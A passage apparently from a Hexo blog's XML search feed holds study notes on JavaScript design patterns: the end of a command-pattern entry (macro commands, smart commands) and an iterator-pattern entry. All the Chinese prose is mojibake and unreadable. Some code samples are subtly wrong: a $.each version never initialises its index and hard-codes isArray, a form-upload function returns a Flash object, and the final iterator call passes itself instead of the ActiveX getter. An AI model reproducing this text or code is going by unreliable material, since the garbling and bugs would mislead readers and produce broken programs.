æ–¹æ³•å¯ä»¥åœ¨ç¨‹åºè¿è¡Œçš„ä»»ä½•æ—¶åˆ»æ‰§è¡Œï¼Œå³ä½¿ç‚¹å‡»æŒ‰é’®çš„è¯·æ±‚æ—©å·²å‘ç”Ÿï¼Œä½†æˆ‘ä»¬çš„å‘½ä»¤å¯¹è±¡ä»ç„¶æ˜¯æœ‰ç”Ÿå‘½çš„ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠ div çš„è¿™äº›è¿åŠ¨è¿‡ç¨‹éƒ½å°è£…æˆä¸ºå‘½ä»¤å¯¹è±¡ï¼Œå†æŠŠå®ƒä»¬åŽ‹è¿›ä¸€ä¸ªé˜Ÿåˆ—å †æ ˆï¼Œå½“åŠ¨ç”»æ‰§è¡Œå®Œï¼Œä¹Ÿå°±æ˜¯å½“å‰çš„ command å¯¹è±¡çš„èŒè´£å®Œæˆä¹‹åŽï¼Œä¼šä¸»åŠ¨é€šçŸ¥é˜Ÿåˆ—ï¼Œæ­¤æ—¶å–å‡ºæ­£åœ¨é˜Ÿåˆ—ä¸­ç­‰çš„ç¬¬ä¸€ä¸ªå‘½ä»¤å¯¹è±¡ï¼Œå¹¶ä¸”æ‰§è¡Œå®ƒã€‚ æˆ‘ä»¬æ¯”è¾ƒå…³æ³¨çš„é—®é¢˜æ˜¯ï¼Œä¸€ä¸ªåŠ¨ç”»ç»“æŸåŽè¯¥å¦‚ä½•é€šçŸ¥é˜Ÿåˆ—ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨å›žè°ƒå‡½æ•°æ¥é€šçŸ¥é˜Ÿåˆ—ï¼Œé™¤äº†å›žè°ƒå‡½æ•°ï¼Œè¿˜å¯ä»¥é€‰å‘å¸ƒ-è®¢é˜…æ¨¡å¼ã€‚å³åœ¨ä¸€ä¸ªåŠ¨ç”»ç»“æŸåŽå‘å¸ƒä¸€ä¸ªæ¶ˆæ¯ï¼Œè®¢é˜…è€…æŽ¥æ”¶åˆ°è¿™ä¸ªæ¶ˆæ¯åŽï¼Œä¾¿å¼€å§‹æ‰§è¡Œé˜Ÿåˆ—é‡Œçš„ä¸‹ä¸€ä¸ªåŠ¨ç”»ã€‚ å®å‘½ä»¤å®å‘½ä»¤æ˜¯ä¸€ç»„å‘½ä»¤çš„é›†åˆï¼Œé€šè¿‡æ‰§è¡Œå®å‘½ä»¤çš„æ–¹å¼ï¼Œå¯ä»¥ä¸€æ¬¡æ‰§è¡Œä¸€æ‰¹å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œå®¶é‡Œæœ‰ä¸€ä¸ªé¥æŽ§å™¨ï¼Œæ¯å¤©å›žå®¶çš„æ—¶å€™ï¼Œåªè¦ä¸€ä¸ªç‰¹åˆ«çš„æŒ‰é’®ï¼Œå®ƒå°±ä¼šå¸®æˆ‘ä»¬å…³ä¸Šæˆ¿é—´é—¨ï¼Œé¡ºä¾¿æ‰“å¼€ç”µè„‘å¹¶ç™»é™† QQã€‚ 1234567891011121314151617181920212223242526272829303132333435var closeDoorCommand = &#123; execute:function()&#123; console.log('å…³é—¨'); &#125;&#125;var openPcCommand = &#123; execute:function()&#123; console.log('å¼€ç”µè„‘'); &#125;&#125;var openQQCommand = &#123; execute:function()&#123; console.log('ç™»å½•QQ'); &#125;&#125;var MacroCommand = function()&#123; return&#123; commandList:[], add:function(command)&#123; this.commandList.push(command); &#125;, execute:function()&#123; for(var i=0,command;command = this.commandList[i++];)&#123; command.execute(); &#125; &#125; &#125;&#125;var macroCommand = new MacroCommand();macroCommand.add(closeDoorCommand);macroCommand.add(openPcCommand);macroCommand.add(openQQCommand);macroCommand.execute(); å½“ç„¶æˆ‘ä»¬è¿˜å¯ä»¥ä¸ºå®å‘½ä»¤æ·»åŠ æ’¤é”€çš„åŠŸèƒ½ï¼Œè·Ÿ macroCommand.execute ç±»ä¼¼ï¼Œå½“è°ƒç”¨ macroCommand.undo æ–¹æ³•çš„æ—¶å€™ï¼Œå®å‘½ä»¤é‡ŒåŒ…å«çš„æ‰€æœ‰å­å‘½ä»¤å¯¹è±¡è¦ä¾æ¬¡æ‰§è¡Œå„è‡ªçš„ undo æ“ä½œã€‚ å®å‘½ä»¤æ˜¯å‘½ä»¤æ¨¡å¼ä¸Žç»„åˆæ¨¡å¼çš„è”ç”¨äº§ç‰©ã€‚ æ™ºèƒ½å‘½ä»¤ä¸Žå‚»ç“œå‘½ä»¤12345var closeDoorCommand = &#123; execute:function()&#123; console.log('å…³é—¨'); &#125;&#125; ä¸Šé¢çš„å‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ° closeDoorCommand ä¸­æ²¡æœ‰ä»»ä½• receiver çš„æ¶ˆæ¯ï¼Œå®ƒæœ¬èº«åŒ…æ½äº†æ‰§è¡Œè¯·æ±‚çš„è¡Œä¸ºï¼Œè¿™è·Ÿæˆ‘ä»¬ä¹‹å‰çš„å‘½ä»¤å¯¹è±¡éƒ½åŒ…å«äº†ä¸€ä¸ª receiver æ˜¯çŸ›ç›¾çš„ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œå‘½ä»¤æ¨¡å¼éƒ½ä¼šåœ¨ command å¯¹è±¡ä¸­ä¿å­˜ä¸€ä¸ªæŽ¥æ”¶è€…æ¥è´Ÿè´£çœŸæ­£æ‰§è¡Œå®¢æˆ·çš„è¯·æ±‚ï¼Œè¿™ç§æƒ…å†µä¸‹çš„å‘½ä»¤å¯¹è±¡æ˜¯ â€œå‚»ç“œå¼â€çš„ï¼Œå®ƒåªè´Ÿè´£æŠŠå®¢æˆ·çš„è¯·æ±‚è½¬äº¤ç»™æŽ¥æ”¶è€…æ¥æ‰§è¡Œï¼Œè¿™ç§æ¨¡å¼çš„å¥½å¤„æ˜¯è¯·æ±‚è€…å’ŒæŽ¥æ”¶è€…ä¹‹é—´å°½å¯èƒ½åœ°è§£è€¦ã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€äº›æ›´èªæ˜Žçš„å‘½ä»¤å¯¹è±¡ï¼Œèªæ˜Žçš„å‘½ä»¤å¯¹è±¡å¯ä»¥ç›´æŽ¥å®žçŽ°è¯·æ±‚ï¼Œè¿™æ ·ä¸€æ¥å°±ä¸å†éœ€è¦æŽ¥æ”¶è€…çš„å­˜åœ¨ï¼Œè¿™ç§èªæ˜Žçš„å‘½ä»¤å¯¹è±¡ä¹Ÿå«åšæ™ºèƒ½å‘½ä»¤ã€‚æ²¡æœ‰æŽ¥æ”¶è€…çš„æ™ºèƒ½å‘½ä»¤ï¼Œé€€åŒ–åˆ°å’Œç­–ç•¥æ¨¡å¼éžå¸¸ç›¸è¿‘ï¼Œä»Žä»£ç ç»“æž„ä¸Šé¢å·²ç»æ— æ³•åˆ†è¾¨å®ƒä»¬äº†ï¼Œèƒ½åˆ†è¾¨çš„åªæœ‰å®ƒä»¬çš„æ„å›¾çš„ä¸åŒã€‚ç­–ç•¥æ¨¡å¼æŒ‡å‘çš„é—®é¢˜é¢†åŸŸæ›´å°ï¼Œæ‰€æœ‰çš„ç­–ç•¥å¯¹è±¡çš„ç›®æ ‡éƒ½æ˜¯ä¸€è‡´çš„ï¼Œå®ƒä»¬åªæ˜¯è¾¾åˆ°è¿™ä¸ªç›®æ ‡çš„ä¸åŒæ‰‹æ®µï¼Œå®ƒä»¬çš„å†…éƒ¨å®žçŽ°æ˜¯é’ˆå¯¹ â€œç®—æ³•â€è€Œè¨€çš„ã€‚è€Œæ™ºèƒ½å‘½ä»¤æ¨¡å¼çš„é—®é¢˜æ›´åŠ å¹¿æ³›ï¼Œcommand å¯¹è±¡è§£å†³çš„ç›®æ ‡æ›´å…·æœ‰å‘æ•£æ€§ã€‚å‘½ä»¤æ¨¡å¼è¿˜å¯ä»¥å®Œæˆæ’¤é”€ï¼ŒæŽ’é˜Ÿç­‰åŠŸèƒ½ã€‚ å°ç»“è·Ÿè®¸å¤šè¯­è¨€ä¸åŒï¼ŒJavaScript å¯ä»¥ç”¨é«˜é˜¶å‡½æ•°éžå¸¸æ–¹ä¾¿åœ°å®žçŽ°å‘½ä»¤æ¨¡å¼ï¼Œåœ¨ JavaScript è¯­è¨€ä¸­ï¼Œå‘½ä»¤æ¨¡å¼æ˜¯ä¸€ç§éšå½¢çš„æ¨¡å¼ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”è¿­ä»£å™¨æ¨¡å¼]]></title>
    <url>%2F2019-02-23-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”è¿­ä»£å™¨æ¨¡å¼è¿­ä»£å™¨æ¨¡å¼æ˜¯æŒ‡æä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­çš„å„ä¸ªå…ƒç´ ï¼Œè€Œåˆä¸éœ€è¦æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚è¿­ä»£å™¨æ¨¡å¼å¯ä»¥æŠŠè¿­ä»£çš„è¿‡ç¨‹ä»Žä¸šåŠ¡é€»è¾‘ä¸­åˆ†ç¦»å‡ºæ¥ï¼Œåœ¨ä½¿ç”¨è¿­ä»£å™¨æ¨¡å¼ä¹‹åŽï¼Œå³ä½¿ä¸å…³å¿ƒå¯¹è±¡çš„å†…éƒ¨æž„é€ ï¼Œä¹Ÿå¯ä»¥æŒ‰é¡ºåºè®¿é—®å…¶ä¸­çš„æ¯ä¸ªå…ƒç´ ã€‚ jQueryä¸­çš„è¿­ä»£å™¨è¿­ä»£å™¨æ¨¡å¼æ— éžæ˜¯å¾ªçŽ¯è®¿é—®èšåˆå¯¹è±¡ä¸­çš„å„ä¸ªå…ƒç´ ã€‚æ¯”å¦‚jQuery ä¸­çš„ $.each å‡½æ•°ï¼Œå…¶ä¸­å›žè°ƒå‡½æ•°ä¸­çš„å‚æ•° i ä¸ºå½“å‰ç´¢å¼•ï¼Œn ä¸ºå½“å‰å…ƒç´ ï¼Œä»£ç å¦‚ä¸‹ï¼š 1234$.each([1,2,3],function(i,n)&#123; console.log('å½“å‰å°æ ‡ä¸ºï¼š'+i); console.log('å½“å‰å€¼ä¸ºï¼š'+n);&#125;); å®žçŽ°è‡ªå·±çš„è¿­ä»£å™¨æˆ‘ä»¬æ¥å®žçŽ°è‡ªå·±çš„ä¸€ä¸ª each å‡½æ•°ï¼Œeach å‡½æ•°æŽ¥å—2ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¢«å¾ªçŽ¯çš„æ•°ç»„ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå¾ªçŽ¯ä¸­çš„æ¯ä¸€æ­¥åŽè¢«è§¦å‘çš„å›žè°ƒå‡½æ•°ã€‚ 123456789var each = function(ary,callback)&#123; for(var i=0,l=ary.length;i&lt;l;i++)&#123; callback.call(ary[i],i,ary[i]); // æŠŠä¸‹æ ‡å’Œå…ƒç´ å½“åšå‚æ•°ä¼ ç»™ callback å‡½æ•° &#125;&#125;each([1,2,3],function(i,n)&#123; console.log(i,n);&#125;); å†…éƒ¨è¿­ä»£å™¨å’Œå¤–éƒ¨è¿­ä»£å™¨è¿­ä»£å™¨å¯ä»¥åˆ†ä¸ºå†…éƒ¨è¿­ä»£å™¨å’Œå¤–éƒ¨è¿­ä»£å™¨ã€‚ 1.å†…éƒ¨è¿­ä»£å™¨ä¸Šé¢çš„ each å‡½æ•°å±žäºŽå†…éƒ¨è¿­ä»£å™¨ï¼Œeach å‡½æ•°çš„å†…éƒ¨å·²ç»å®šä¹‰å¥½äº†è¿­ä»£è§„åˆ™ï¼Œå®ƒå®Œå…¨æŽ¥æ‰‹äº†æ•´ä¸ªè¿­ä»£è¿‡ç¨‹ï¼Œå¤–éƒ¨åªéœ€è¦ä¸€æ¬¡åˆå§‹è°ƒç”¨ã€‚ å†…éƒ¨è¿­ä»£å™¨åœ¨è°ƒç”¨çš„æ—¶å€™éžå¸¸æ–¹ä¾¿ï¼Œå¤–ç•Œæ ¹æœ¬ä¸éœ€è¦å…³å¿ƒè¿­ä»£å™¨å†…éƒ¨çš„å®žçŽ°ï¼Œè·Ÿè¿­ä»£å™¨çš„äº¤äº’ä¹Ÿä»…ä»…æ˜¯ä¸€æ¬¡åˆå§‹è°ƒç”¨ï¼Œä½†è¿™ä¹Ÿæ˜¯å†…éƒ¨è¿­ä»£å™¨çš„ç¼ºç‚¹ã€‚ç”±äºŽå†…éƒ¨è¿­ä»£å™¨çš„è¿­ä»£è§„åˆ™å·²ç»è¢«æå‰è§„å®šï¼Œä¸Šé¢çš„ each å‡½æ•°å°±æ— æ³•åŒæ—¶è¿­ä»£ä¸¤ä¸ªæ•°ç»„äº†ã€‚ æ¯”å¦‚çŽ°åœ¨æœ‰ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦åˆ¤æ–­2ä¸ªæ•°ç»„å…ƒç´ çš„å€¼æ˜¯å¦å®Œå…¨ç›¸ç­‰ï¼Œå¦‚æžœä¸æ”¹å†™ each å‡½æ•°æœ¬èº«çš„ä»£ç ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå…¥æ‰‹çš„å°±åªæœ‰ each å‡½æ•°çš„å›žè°ƒå‡½æ•°äº†ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324var each = function(ary,callback)&#123; for(var i=0,l=ary.length;i&lt;l;i++)&#123; callback.call(ary[i],i,ary[i]); // æŠŠä¸‹æ ‡å’Œå…ƒç´ å½“åšå‚æ•°ä¼ ç»™ callback å‡½æ•° &#125;&#125;each([1,2,3],function(i,n)&#123; console.log(i,n);&#125;);var compare = function(ary1,ary2)&#123; if(ary1.length !== ary2.length)&#123; throw new Error('ary1 å’Œ ary2 ä¸ç›¸ç­‰'); &#125; each(ary1,function(i,n)&#123; if(n !== ary2[i])&#123; throw new Error('ary1 å’Œ ary2 ä¸ç›¸ç­‰'); &#125; &#125;) console.log('ary1 å’Œ ary2 ç›¸ç­‰');&#125;compare([1,2,3],[1,2,3]); åœ¨ä¸€äº›æ²¡æœ‰é—­åŒ…çš„è¯­è¨€ä¸­ï¼Œå†…éƒ¨è¿­ä»£å™¨æœ¬èº«çš„å®žçŽ°ä¹Ÿç›¸å½“å¤æ‚ï¼Œæ¯”å¦‚ C è¯­è¨€ä¸­çš„å†…éƒ¨è¿­ä»£å™¨æ˜¯ç”¨å‡½æ•°çš„æŒ‡é’ˆæ¥å®žçŽ°çš„ï¼Œå¾ªçŽ¯å¤„ç†éœ€è¦çš„æ•°æ®éƒ½è¦ä»¥å‚æ•°çš„å½¢å¼æ˜Žç¡®åœ°ä»Žå¤–éƒ¨ä¼ é€’è¿›åŽ»ã€‚ 2.å¤–éƒ¨è¿­ä»£å™¨å¤–éƒ¨è¿­ä»£å™¨å¿…é¡»æ˜¾å¼åœ°è¯·æ±‚è¿­ä»£ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚ å¤–éƒ¨è¿­ä»£å™¨å¢žåŠ äº†ä¸€äº›è°ƒç”¨çš„å¤æ‚åº¦ï¼Œä½†ç›¸å¯¹ä¹Ÿå¢žå¼ºäº†è¿­ä»£å™¨çš„çµæ´»æ€§ï¼Œå¯ä»¥æ‰‹å·¥æŽ§åˆ¶è¿­ä»£å™¨çš„è¿‡ç¨‹æˆ–è€…æ˜¯é¡ºåºã€‚ 123456789101112131415161718192021222324252627282930var Iterator = function(obj)&#123; var current = 0; var next = function()&#123; current += 1; &#125; var isDone = function()&#123; return current &gt;= obj.length; &#125; var getCurrItem = function()&#123; return obj[current]; &#125; return&#123; next, isDone, getCurrItem &#125;&#125;// æ”¹å†™ compare å‡½æ•°var compare = function(iterator1,iterator2)&#123; while(!iterator1.isDone() &amp;&amp; !iterator2.isDone())&#123; if(iterator1.getCurrItem() !== iterator2.getCurrItem())&#123; throw new Error('iterator1 å’Œ iterator2 ä¸ç›¸ç­‰'); &#125; iterator1.next(); iterator2.next(); &#125; console.log('iterator1 å’Œ iterator2 ç›¸ç­‰');&#125;compare(Iterator([1,2,3]),Iterator([1,2,4])); å¤–éƒ¨è¿­ä»£å™¨è™½ç„¶è°ƒç”¨æ–¹å¼ç›¸å¯¹å¤æ‚ï¼Œä½†å®ƒçš„é€‚ç”¨é¢æ›´å¹¿ï¼Œä¹Ÿèƒ½æ»¡è¶³æ›´å¤šå˜çš„éœ€æ±‚ï¼Œå†…éƒ¨è¿­ä»£å™¨å’Œå¤–éƒ¨è¿­ä»£å™¨åœ¨å®žé™…ç”Ÿäº§ä¸­æ²¡æœ‰ä¼˜åŠ£ä¹‹åˆ†ï¼Œä½¿ç”¨å“ªä¸ªè¦æ ¹æ®éœ€æ±‚åœºæ™¯è€Œå®šã€‚ è¿­ä»£ç±»æ•°ç»„å¯¹è±¡å’Œå­—é¢é‡å¯¹è±¡è¿­ä»£å™¨æ¨¡å¼ä¸ä»…å¯ä»¥è¿­ä»£æ•°ç»„ï¼Œè¿˜å¯ä»¥è¿­ä»£ä¸€äº›ç±»æ•°ç»„çš„å¯¹è±¡ã€‚æ¯”å¦‚ arguments ã€{â€œ0â€ï¼ša,â€1â€ï¼šb}ç­‰ã€‚é€šè¿‡ä¸Šé¢çš„ä»£ç å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œæ— è®ºæ˜¯å†…éƒ¨è¿­ä»£å™¨è¿˜æ˜¯å¤–éƒ¨è¿­ä»£å™¨ï¼Œåªè¦è¢«è¿­ä»£çš„èšåˆå¯¹è±¡æ‹¥æœ‰ length å±žæ€§è€Œä¸”å¯ä»¥ç”¨ä¸‹æ ‡è®¿é—®ï¼Œé‚£å®ƒå°±å¯ä»¥è¢«è¿­ä»£ã€‚ åœ¨ JavaScript ä¸­ï¼Œfor inè¯­å¥å¯ä»¥ç”¨æ¥è¿­ä»£æ™®é€šå­—é¢é‡å¯¹è±¡çš„å±žæ€§ï¼Œ jQuery ä¸­æä¾›äº† $.each å‡½æ•°æ¥å°è£…å„ç§è¿­ä»£è¡Œä¸ºã€‚ 12345678910111213141516171819202122$.each = function(obj,callback)&#123; var value, i, length = obj.length, isArray = true; if(isArray)&#123; // è¿­ä»£ç±»æ•°ç»„ for(;i&lt;length;i++)&#123; value = callback.call(obj[i],i,obj[i]); if(value === false)&#123; break; &#125; &#125; &#125;else&#123; for(i in obj)&#123; value = callback.call(obj[i],i,obj[i]); if(value === false)&#123; break; &#125; &#125; &#125; return obj;&#125; å€’åºè¿­ä»£å™¨è¿­ä»£å™¨æ¨¡å¼æä¾›äº†å¾ªçŽ¯è®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­æ¯ä¸ªå…ƒç´ çš„æ–¹æ³•ï¼Œä½†å®ƒæ²¡æœ‰è§„å®šæˆ‘ä»¬ä»¥é¡ºåºè¿˜æ˜¯å€’åºç”šè‡³æ˜¯ ä¸­åºæ¥å¾ªçŽ¯éåŽ†å¯¹è±¡ã€‚ å®žçŽ°ä¸€ä¸ªå€’åºéåŽ†çš„è¿­ä»£å™¨ï¼š 12345678var reverseEach = function(ary,callback)&#123; for(var l = ary.length-1; l &gt;= 0; l--)&#123; callback.call(ary[l],l,ary[l]); &#125;&#125;reverseEach([1,2,3],function(i,n)&#123; console.log(i,n);&#125;); ä¸­æ­¢è¿­ä»£å™¨è¿­ä»£å™¨å¯ä»¥åƒæ™®é€š for å¾ªçŽ¯ä¸­çš„ break ä¸€æ ·ï¼Œæä¾›ä¸€ç§è·³å‡ºå¾ªçŽ¯çš„æ–¹æ³•ï¼Œåœ¨ jQuery çš„ each å‡½æ•°ä¸­æœ‰è¿™æ ·çš„ä¸€å¥è¯ 123if(value === false)&#123; break;&#125; è¿™å¥è¯çš„æ„æ€æ˜¯ï¼Œçº¦å®šå¦‚æžœå›žè°ƒå‡½æ•°çš„æ‰§è¡Œç»“æžœè¿”å›ž false ï¼Œåˆ™æå‰ç»ˆæ­¢å¾ªçŽ¯ã€‚ æˆ‘ä»¬å¯ä»¥æŠŠä¹‹å‰çš„ each å‡½æ•°æ”¹å†™ä¸€ä¸‹ 1234567891011121314var each = function(ary,callback)&#123; for(var i=0,l=ary.length;i&lt;l;i++)&#123; if(callback.call(ary[i],i,ary[i]) === false)&#123; break; &#125; &#125;&#125;each([1,2,3,4,5],function(i,n)&#123; if(n &gt; 3)&#123; return false; &#125; console.log(n);&#125;); è¿­ä»£å™¨æ¨¡å¼çš„åº”ç”¨ä¸¾ä¾‹å½“ä½œè€…é‡æž„æŸä¸ªé¡¹ç›®ä¸­æ–‡ä»¶ä¸Šä¼ æ¨¡å¼çš„ä»£ç çš„æ—¶å€™ï¼Œä»–å‘çŽ°äº†ä¸‹é¢è¿™æ®µä»£ç ï¼Œå®ƒçš„ç›®çš„æ˜¯æ ¹æ®ä¸åŒçš„æµè§ˆå™¨èŽ·å–ç›¸åº”çš„ä¸Šä¼ ç»„ä»¶å¯¹è±¡ï¼š 12345678910111213var getUploadObj = function()&#123; try&#123; return new ActiveXObject('TXFTNActiveX.FTNUpload'); // IE ä¸Šä¼ æŽ§ä»¶ &#125;catch(e)&#123; if(supportFlash())&#123; var str = '&lt;object type="application/x-shockwave-flash"&gt;&lt;/object&gt;' return $(str).appendTo($('body')); &#125;else&#123; var str = '&lt;input type="file" name="file" /&gt;' // è¡¨å•ä¸Šä¼  return $(str).appendTo($('body')); &#125; &#125;&#125; åœ¨ä¸åŒæµè§ˆå™¨çŽ¯å¢ƒä¸‹ï¼Œé€‰æ‹©çš„ä¸Šä¼ æ–¹å¼ä¸åŒï¼Œå› ä¸ºä½¿ç”¨æµè§ˆå™¨çš„ä¸Šä¼ ç©ºé—´è¿›è¡Œä¸Šä¼ é€Ÿåº¦å¿«ï¼Œå¯ä»¥æš‚åœå’Œç»­ä¼ ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šé¦–å…ˆé€‰æ‹©ä½¿ç”¨æŽ§ä»¶ä¸Šä¼  ï¼Œå¦‚æžœæµè§ˆå™¨æ²¡æœ‰å®‰è£…ä¸Šä¼ æŽ§ä»¶ï¼Œåˆ™ä½¿ç”¨ flash ä¸Šä¼ ï¼Œå¦‚æžœ è¿ž Flash ä¹Ÿæ²¡æœ‰ä¸Šä¼ å°±ä½¿ç”¨æµè§ˆå™¨åŽŸç”Ÿçš„è¡¨å•ä¸Šä¼ äº†ã€‚ ä¸Šé¢çš„ä»£ç å¯è¯»æ€§å·®ï¼Œä¸¥é‡è¿åäº†å¼€é—­åŽŸåˆ™ã€‚åœ¨å¼€å‘å’Œè°ƒè¯•ä¸­æˆ‘ä»¬éœ€è¦æ¥å›žåˆ‡æ¢ä¸åŒçš„ä¸Šä¼ æ–¹å¼ï¼ŒåŽæ¥è¿˜æ”¯æŒäº† HTML5 ä¸Šä¼ ï¼Œè¿™æ—¶å€™å”¯ä¸€çš„æ–¹æ³•å°±æ˜¯ç»§ç»­å¾€ getUploadObj å‡½æ•°é‡Œé¢å¢žåŠ åˆ†æ”¯æ¡ä»¶ã€‚ æ¢³ç†ä¸€ä¸‹é—®é¢˜ï¼Œç›®å‰ä¸€å…±æœ‰ 3 ç§å¯èƒ½ä¸Šä¼ çš„æ–¹å¼ï¼Œæˆ‘ä»¬ä¸çŸ¥é“æ­£åœ¨ä½¿ç”¨çš„æµè§ˆå™¨æ”¯æŒå“ªå‡ ç§ã€‚å°±å¥½æ¯”æˆ‘ä»¬æœ‰ä¸€ä¸ªé’¥åŒ™ä¸²ï¼Œå…¶ä¸­å…±æœ‰3æŠŠé’¥åŒ™ï¼Œæˆ‘ä»¬æƒ³è¦æ‰“å¼€ä¸€æ‰‡é—¨ä½†æ˜¯ä¸çŸ¥é“è¯¥ä½¿ç”¨å“ªæŠŠé’¥åŒ™ï¼ŒäºŽæ˜¯ä»Žç¬¬ä¸€æŠŠé’¥åŒ™å¼€å§‹ï¼Œè¿­ä»£é’¥åŒ™ä¸²è¿›è¡Œå°è¯•ï¼Œç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„é’¥åŒ™ä¸ºæ­¢ã€‚ åŒæ ·ï¼Œæˆ‘ä»¬æŠŠæ¯ç§èŽ·å– upload å¯¹è±¡çš„æ–¹æ³•éƒ½å°è£…åœ¨å„è‡ªçš„å‡½æ•°é‡Œï¼Œç„¶åŽä½¿ç”¨ä¸€ä¸ªè¿­ä»£å™¨ï¼Œè¿­ä»£èŽ·å–è¿™äº› upload å¯¹è±¡ï¼ŒçŸ¥é“èŽ·å–åˆ°ä¸€ä¸ªå¯ç”¨çš„ä¸ºæ­¢ï¼š 12345678910111213141516171819var getActiveUploadObj = function()&#123; try&#123; return new ActiveXObject('TXFTNActiveX.FTNUpload'); &#125;catch(e)&#123; return false; &#125;&#125;var getFlashUploadObj = function()&#123; if(supportFlash())&#123; var str = '&lt;object type="application/x-shockwave-flash"&gt;&lt;/object&gt;' return $(str).appendTo($('body')); &#125; return false;&#125;var getFormUploadObj = function()&#123; var str = '&lt;object type="application/x-shockwave-flash"&gt;&lt;/object&gt;' return $(str).appendTo($('body'));&#125; åœ¨ä¸Šé¢3ä¸ªå‡½æ•°ä¸­éƒ½æœ‰åŒä¸€ä¸ªçº¦å®šï¼šå¦‚æžœè¯¥å‡½æ•°é‡Œé¢çš„ upload å¯¹è±¡æ˜¯å¯ç”¨çš„ï¼Œåˆ™è®©å‡½æ•°è¿”å›žè¯¥å¯¹è±¡ï¼Œåä¹‹åˆ™è¿”å›ž false,æç¤ºè¿­ä»£å™¨ç»§ç»­å¾€åŽé¢è¿›è¡Œè¿­ä»£ã€‚ æ‰€ä»¥æˆ‘ä»¬çš„è¿­ä»£å™¨åªéœ€è¦è¿›è¡Œä¸‹é¢çš„å‡ æ­¥å·¥ä½œã€‚ æä¾›ä¸€ä¸ªå¯ä»¥è¢«è¿­ä»£çš„æ–¹æ³•ï¼Œä½¿å¾—ä¸Šé¢ä¸‰ä¸ªå‡½æ•°ä¾ç…§ä¼˜å…ˆçº§è¢«å¾ªçŽ¯è¿­ä»£ å¦‚æžœæ­£åœ¨è·Œæ‰“çš„å‡½æ•°è¿”å›žä¸€ä¸ªå¯¹è±¡ï¼Œåˆ™è¡¨ç¤ºæ‰¾æ‰“äº†æ­£ç¡® çš„ä¸Šä¼ å¯¹è±¡ï¼Œåä¹‹å¦‚æžœè¯¥å‡½æ•°è¿”å›ž falseï¼Œåˆ™è®©è¿­ä»£å™¨ç»§ç»­å·¥ä½œã€‚ è¿­ä»£å™¨ä»£ç å¦‚ä¸‹ï¼š 123456789var iteratorUploadObj = function()&#123; for(var i=0,fn;fn=arguments[i++];)&#123; var uploadObj = fn(); if(uploadObj !== false)&#123; return uploadObj; &#125; &#125;&#125;var uploadObj = iteratorUploadObj(getFlashUploadObj,getFormUploadObj,iteratorUploadObj); é‡æž„ä»£ç ä¹‹åŽï¼Œå¯ä»¥çœ‹åˆ°ä¸åŒä¸Šä¼ å¯¹è±¡çš„æ–¹æ³•è¢«éš”ç¦»åœ¨å„è‡ªçš„å‡½æ•°é‡Œé¢äº’ä¸å¹²æ‰°ï¼Œtry/catch å’Œ if åˆ†æ”¯ä¸å†çº ç¼ åˆ°ä¸€èµ·ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç»´æŠ¤å’Œæ‰©å±•ä»£ç ã€‚åŽæ¥ï¼Œæˆ‘ä»¬æ–°å¢ž Webkit æŽ§ä»¶ä¸Šä¼ å’Œ HTML5 ä¸Šä¼ ï¼Œæˆ‘ä»¬è¦åšçš„ä»…ä»…æ˜¯åˆ†åˆ«å¢žåŠ è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œç„¶åŽæŠŠè¿™ä¸¤ä¸ªå‡½æ•°åŠ åˆ° iteratorUploadObj å‡½æ•°çš„å‚æ•°é‡Œé¢è¿›åŽ»ã€‚ 